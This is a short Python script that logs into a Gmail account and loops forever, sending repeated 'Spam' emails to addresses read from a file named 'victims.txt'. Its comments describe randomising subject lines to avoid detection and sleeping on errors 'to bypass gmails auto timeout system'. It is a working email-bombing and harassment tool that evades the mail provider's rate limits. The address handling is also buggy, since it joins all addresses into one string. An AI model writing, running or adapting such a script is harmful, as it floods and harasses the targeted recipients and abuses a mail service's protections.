import smtplib
from email.mime.text import MIMEText
from time import sleep
from random import randint

login = open("login.txt", "r").read().split() # Other file containing login details
username = login[0]
password = login[1]

def start_server():
    server = smtplib.SMTP('smtp.gmail.com:587')
    server.ehlo()
    server.starttls()
    server.login(username, password)
    return server

def quit_server(server):
    server.quit()

def send_emails(server):
    emails = "".join(open("victims.txt", "r").read().split()) # File containing victims email addresses
    for email in range(100):
        print(email) # Just to see how many emails are being sent
        msg = MIMEText("Spam")
        msg['Subject'] = 'Spam ' + str(randint(0, 1000000)) # Adding a random number to prevent the subjects being the same
        msg['From'] = username
        msg['To'] = emails
        server.sendmail(username, emails, msg.as_string())

def main():
    while True:
        server = start_server()
        try:
            send_emails(server)
        except Exception as e:
            sleep(60) # To bypass gmails auto timeout system

if __name__ == "__main__":
    main()
